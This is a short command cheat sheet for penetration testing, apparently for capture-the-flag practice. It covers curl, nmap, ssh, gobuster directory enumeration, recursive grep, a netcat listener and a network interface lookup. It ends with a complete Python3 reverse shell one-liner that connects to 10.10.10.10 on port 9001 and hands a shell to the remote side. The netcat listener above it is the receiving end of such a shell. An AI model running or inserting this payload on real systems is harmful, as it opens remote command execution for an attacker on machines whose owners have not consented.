# Accessing website or application through linux
curl <server-ip>

# Network Mapper to find open ports and services
nmap <server-ip>

# SSH to server
ssh username@server

# gobuster for directory enum
gobuster dir -u <url> -w <wordlist_file.txt> -x <file_extensions>

# Search recurively through directories finding any character match
grep -R .

# Start listening for connection on port 9999
nc -lvnp 9999

# Find the ip address of your main nic
ip addr show eth0

# Reverse Shell with Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
